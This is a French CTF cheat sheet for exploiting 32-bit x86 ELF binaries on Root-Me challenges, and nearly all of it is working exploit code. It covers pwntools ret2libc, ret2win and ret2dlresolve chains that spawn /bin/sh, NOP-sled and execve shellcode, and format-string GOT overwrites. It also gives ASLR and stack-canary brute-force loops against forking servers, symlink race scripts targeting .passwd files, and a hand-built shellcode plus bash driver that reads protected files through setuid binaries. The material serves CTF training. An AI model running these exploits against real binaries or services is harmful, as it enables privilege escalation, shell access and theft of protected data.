# CTF App-System — ELF x86 (32-bit)

## Spécificités 32-bit vs 64-bit

| Aspect | x86 32-bit | x86-64 |
|--------|-----------|--------|
| **Convention d'appel** | cdecl : args sur la pile | Registres rdi, rsi, rdx... |
| **Adresses** | 4 octets (0x08048xxx) | 8 octets (0x55..., 0x7f...) |
| **Syscalls** | `int 0x80`, eax=numéro | `syscall`, rax=numéro |
| **ASLR** | 8-bit d'entropie (stack) | 28-bit (plus difficile à bruteforcer) |
| **ret2libc** | system(addr_binsh) simplifié | Besoin de gadgets pop rdi/ret |
| **Shellcode** | Facile (i386) | NX rend nécessaire ROP |

## Stack layout 32-bit

```
[    arg2    ]  ← esp+8 après call
[    arg1    ]  ← esp+4
[ return addr]  ← esp+0  (← RIP overwrite ici)
[  saved ebp ]  ← ebp
[ local vars ]
[  buffer    ]  ← ebp-N
```

**Offset** = N (taille buffer) + 4 (saved EBP) → overwrite return address.

## ret2libc 32-bit (le plus fréquent sur Root-Me)

```python
from pwn import *

elf = ELF('./challenge')
libc = ELF('./libc.so.6')

# Adresses fixes si pas de PIE (classique Root-Me x86)
system_plt = elf.plt['system']       # si dans PLT
puts_plt   = elf.plt['puts']
puts_got   = elf.got['puts']

# === Stage 1 : leak libc via puts(puts@GOT) ===
offset = 76  # buffer + saved_ebp

payload = b'A' * offset
payload += p32(puts_plt)        # call puts
payload += p32(elf.symbols['main'])  # return après puts (stage 2)
payload += p32(puts_got)        # arg1 : adresse à leaker

io.sendline(payload)
puts_leak = u32(io.recv(4))
libc_base = puts_leak - libc.symbols['puts']
system = libc_base + libc.symbols['system']
binsh  = libc_base + next(libc.search(b'/bin/sh'))

# === Stage 2 : system("/bin/sh") ===
payload2 = b'A' * offset
payload2 += p32(system)         # call system
payload2 += p32(0xdeadbeef)    # return address (peu importe)
payload2 += p32(binsh)          # arg1 : "/bin/sh"

io.sendline(payload2)
io.interactive()
```

## ret2win 32-bit (pas de leak requis)

```python
# Trouver la win function
elf = ELF('./challenge')
win = elf.symbols['win']  # ou 'flag', 'backdoor', etc.

offset = 76
payload = b'A' * offset + p32(win)
```

## ret2libc sans leak (quand PIE désactivé)

```python
# Si PIE désactivé : adresses fixes dans le binaire
# Chercher /bin/sh dans le binaire lui-même
binsh_addr = next(elf.search(b'/bin/sh\x00'))

# Chercher system dans PLT ou libc avec adresse connue
# ROPgadget --binary ./challenge --string "/bin/sh"
```

## Shellcode 32-bit (quand NX désactivé)

```python
from pwn import *
context.arch = 'i386'

shellcode = asm(shellcraft.sh())  # shellcode i386 minimal

# Stack shellcode : overflow → RET = adresse du shellcode sur la pile
offset = 64
# Trouver l'adresse de la pile : via leak ou via NOP sled
nop_sled = b'\x90' * 100
payload = nop_sled + shellcode + b'A' * (offset - len(nop_sled) - len(shellcode))
payload += p32(stack_addr)  # adresse dans le NOP sled
```

## Format string 32-bit

```python
# Leak de la pile : les arguments sont à partir du 1er paramètre positionnel
# En 32-bit, les args format string SONT sur la pile directement

# Trouver son offset sur la pile
for i in range(1, 30):
    io.sendline(f'%{i}$x'.encode())
    print(i, io.recvline())

# Écrire en 32-bit : cible = adresse 4 octets
# %<val>c%<N>$n écrit <val> à l'adresse N sur la pile
from pwn import fmtstr_payload
payload = fmtstr_payload(offset, {got_addr: target_addr})
# offset = position de notre input sur la pile (trouver avec %N$x == 0x41414141)
```

## Trouver l'offset de l'overflow

```bash
# Méthode 1 : cyclic pattern
python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))"  | ./challenge
# Voir le crash : dmesg | tail ou gdb

# Méthode 2 : GDB local
gdb ./challenge
run <<< $(python3 -c "from pwn import *; sys.stdout.buffer.write(cyclic(200))")
# Après crash : x/x $eip → valeur EIP corrompue
python3 -c "from pwn import *; print(cyclic_find(0x61616164))"

# Méthode 3 : binary search manuelle
python3 -c "print('A'*76 + 'BBBB')" | ./challenge  # EIP = 0x42424242 ?
```

## ret2dlresolve 32-bit (sans libc leak)

```python
from pwn import *
elf = ELF('./challenge')
rop = ROP(elf)

# Créer payload ret2dlresolve
dlresolve = Ret2dlresolvePayload(elf, symbol="system", args=["/bin/sh"])
rop.read(0, dlresolve.data_addr, len(dlresolve.payload))
rop.ret2dlresolve(dlresolve)

raw_rop = rop.chain()
offset = 76
payload = fit({offset: raw_rop}, length=offset+len(raw_rop))
io.sendline(payload)
io.send(dlresolve.payload)
io.interactive()
```

## Techniques de bypass 32-bit

### ASLR Brute-force (32-bit seulement)

```python
# En 32-bit, seulement ~256 valeurs possibles pour l'adresse de base de la pile
# Brute-force possible sur serveur forking

for i in range(256):
    io = process('./challenge')
    # Tenter avec adresse fixe supposée
    payload = b'A' * offset + p32(stack_guess)
    io.sendline(payload)
    try:
        io.recv(timeout=0.5)
        print("SUCCESS!")
        io.interactive()
        break
    except:
        io.close()
```

### ASLR par-processus sur Root-Me (piège critique)

**Symptôme** : le scan trouve l'adresse du buffer, mais l'exploit échoue à chaque fois.

**Cause** : Sur les serveurs Root-Me, `setarch i386 -R` ne désactive PAS entièrement l'ASLR de la pile. L'adresse du buffer est re-randomisée à chaque exécution du binaire (entropie ~1,6 Mo observée). Même au sein d'un même script bash, chaque `subprocess.run()` ou fork donne une adresse différente.

**Règle absolue** : Scan et exploit doivent se produire dans **le même processus**. Ne jamais chercher l'adresse dans un appel et l'exploiter dans un autre.

**Solution : shellcode combiné scan+exploit**

```python
# Shellcode qui fait TOUT en une seule exécution :
# 1. Écrit ESP sur stdout (preuve d'exécution + adresse)
# 2. Ouvre le fichier flag
# 3. Lit le flag
# 4. Écrit le flag sur stdout
# 5. Exit

# i386, 32-bit, syscalls int 0x80
sc = bytes([
    # Part 1 : écrire ESP (4 octets) sur stdout
    0x54,             # push esp
    0x89, 0xe1,       # mov ecx, esp   (pointe vers la valeur ESP empilée)
    0x6a, 0x04, 0x5a, # push 4; pop edx
    0x6a, 0x01, 0x5b, # push 1; pop ebx (stdout)
    0x6a, 0x04, 0x58, # push 4; pop eax (sys_write=4)
    0xcd, 0x80,       # int 0x80
    # Part 2 : ouvrir le fichier (chemin empilé en reverse dwords)
    # [push du chemin complet en dwords little-endian, reversed]
    # ex: "/challenge/app-systeme/ch21/.passwd\0" en 9 dwords
    0x89, 0xe3,       # mov ebx, esp  (ptr vers le chemin)
    0x31, 0xc9,       # xor ecx, ecx  (O_RDONLY=0)
    0x31, 0xd2,       # xor edx, edx
    0x6a, 0x05, 0x58, 0xcd, 0x80,  # push 5; pop eax; int 0x80 -> sys_open
    # Part 3 : lire
    0x89, 0xc3,       # mov ebx, eax  (fd)
    0x83, 0xec, 0x40, # sub esp, 64
    0x89, 0xe1,       # mov ecx, esp
    0x6a, 0x40, 0x5a, # push 64; pop edx
    0x6a, 0x03, 0x58, 0xcd, 0x80,  # sys_read
    # Part 4 : écrire sur stdout
    0x89, 0xc2,       # mov edx, eax (bytes_read)
    0x89, 0xe1,       # mov ecx, esp
    0x6a, 0x01, 0x5b, # push 1; pop ebx (stdout)
    0x6a, 0x04, 0x58, 0xcd, 0x80,  # sys_write
    # Part 5 : exit
    0x31, 0xdb,       # xor ebx, ebx
    0x6a, 0x01, 0x58, 0xcd, 0x80,  # sys_exit(0)
])
```

**Stratégie de scan avec shellcode combiné** (depuis bash) :

```bash
#!/bin/bash
B='/path/to/setuid/binary'
N=-1869574000  # 0x90909090 NOP

# Générer le fichier exploit (base fixe) avec awk
awk -v n="$N" -v sc="$COMBINED_CHUNKS" 'BEGIN{
    for(i=1;i<996;i++){print n; print i}
    nsc=split(sc,a," ")
    for(j=1;j<=nsc;j++){if(a[j]+0!=0){print a[j]; print 995+j}}
}' > /tmp/base.txt

# Boucle de brute-force ASLR : ~400 essais en moyenne (sled 4KB, range ~1,6MB)
addr=4294963200  # 0xFFFFF000
cnt=0
while [ $cnt -lt 5000 ]; do
    if [ $addr -gt 2147483647 ]; then rd=$((addr-4294967296)); else rd=$addr; fi
    { cat /tmp/base.txt; printf '%d\n-15\n' $rd; } > /tmp/ew.txt
    timeout 2 setarch i386 -R "$B" /tmp/ew.txt > /tmp/out.bin 2>/dev/null
    cnt=$((cnt+1))
    sz=$(wc -c < /tmp/out.bin 2>/dev/null | tr -d ' ')
    sz=${sz:-0}
    if [ "$sz" -gt 4 ]; then          # >4 octets = ESP (4B) + flag
        dd if=/tmp/out.bin bs=1 skip=4 2>/dev/null; echo; break
    elif [ "$sz" -eq 4 ]; then         # =4 octets = exécution OK mais fichier inaccessible
        echo "[EXEC mais pas de flag - problème setuid ?]"
    fi
    addr=$((addr - 3840))
    [ $addr -lt 4278190080 ] && addr=4294963200  # wrap around
done
```

**Diagnostic de l'exécution du shellcode** :

```python
# Shellcode "write-ESP" : confirme que le shellcode tourne ET donne l'adresse
# push esp; mov ecx,esp; push4; pop edx; push1; pop ebx; push4; pop eax; int80; push1; pop eax; xor ebx,ebx; int80
ESP_SC_BYTES = bytes([
    0x54, 0x89, 0xe1, 0x6a, 0x04, 0x5a,
    0x6a, 0x01, 0x5b, 0x6a, 0x04, 0x58,
    0xcd, 0x80,
    0x31, 0xdb, 0x6a, 0x01, 0x58, 0xcd, 0x80,
])
# Si sortie = 4 octets → ESP = struct.unpack('<I', out[:4])[0]
# buf_addr = ESP + 0x38 (vérifier avec Ghidra/r2)

# Interprétation des résultats :
# sz=0  → redirect rate la NOP sled (SIGSEGV) → continuer le scan
# sz=4  → shellcode tourne MAIS sys_open échoue (EACCES ? setuid KO ?)
# sz>4  → shellcode tourne ET flag lu avec succès
```

**Contrainte "pas de dword nul"** dans les primitives d'écriture arbitraire :

```python
# Certains binaires skippent les paires (VALUE, INDEX) si VALUE == 0.
# S'assurer que TOUS les chunks du shellcode sont non-nuls :

import struct
chunks = [struct.unpack('<i', sc[i:i+4])[0] for i in range(0, len(sc), 4)]
zeros = [(i, v) for i, v in enumerate(chunks) if v == 0]
# Si zeros non-vide → réécrire les instructions concernées :
# push 0; pop ebx  → xor ebx, ebx  (évite le chunk 0x5b006a00)
# push 0x00...    → xor eax,eax; push eax (si nécessaire)
```

### Serveur forking : canary brute-force byte par byte

```python
canary = b'\x00'  # Toujours commence par \x00

for byte_idx in range(1, 4):  # 3 octets restants (32-bit canary = 4 bytes)
    for byte_val in range(256):
        io = remote(HOST, PORT)
        payload = b'A' * offset + canary + bytes([byte_val])
        io.sendline(payload)
        response = io.recv(timeout=0.5)
        if b'*** stack smashing' not in response:
            canary += bytes([byte_val])
            break
        io.close()
```

## Race condition (Root-Me classique)

```bash
# Pattern typique : programme vérifie un fichier, puis l'ouvre → TOCTOU
# Exploit : créer/supprimer le fichier en boucle pendant que le prog accède

# Script bash race
while true; do
    ln -sf /challenge/.passwd /tmp/target &
    rm /tmp/target &
done &
# Lancer le programme en parallèle

# Python race avec threads
import threading, os, time

def swap():
    while True:
        os.symlink('/challenge/.passwd', '/tmp/file')
        os.remove('/tmp/file')

t = threading.Thread(target=swap, daemon=True)
t.start()
# Lancer le binaire en boucle
```

## Syscalls 32-bit (int 0x80)

```python
# Quand seccomp bloque les syscalls 64-bit
# int 0x80 utilise des numéros différents !
# x86 32-bit syscall table
SYSCALL_READ  = 3
SYSCALL_WRITE = 4
SYSCALL_OPEN  = 5
SYSCALL_EXECVE = 11

shellcode_32 = asm('''
    xor eax, eax
    push eax
    push 0x68732f2f  ; //sh
    push 0x6e69622f  ; /bin
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    mov eax, 11      ; execve
    int 0x80
''', arch='i386')
```

## Gadgets ROPgadget 32-bit

```bash
# Lister les gadgets utiles
ROPgadget --binary ./challenge --rop | grep "pop ebx"
ROPgadget --binary ./challenge --rop | grep "int 0x80"
ROPgadget --binary ./challenge --rop | grep "call system"

# Gadgets classiques en 32-bit
# pop ebx; ret       → contrôler 1er arg
# pop ecx; pop ebx; ret  → 2ème et 1er arg
# int 0x80; ret      → syscall
# leave; ret         → stack pivot
```

## Protections Root-Me x86 typiques

```bash
# Challenges basiques (pas de protection)
checksec --file=challenge
# Arch: i386-32-little | RELRO: No RELRO | Stack: No canary | NX: NX disabled | PIE: No PIE

# Challenges intermédiaires
# RELRO: Partial RELRO | Stack: No canary | NX: NX enabled | PIE: No PIE

# Challenges avancés
# RELRO: Full RELRO | Stack: Canary found | NX: NX enabled | PIE: PIE enabled
```
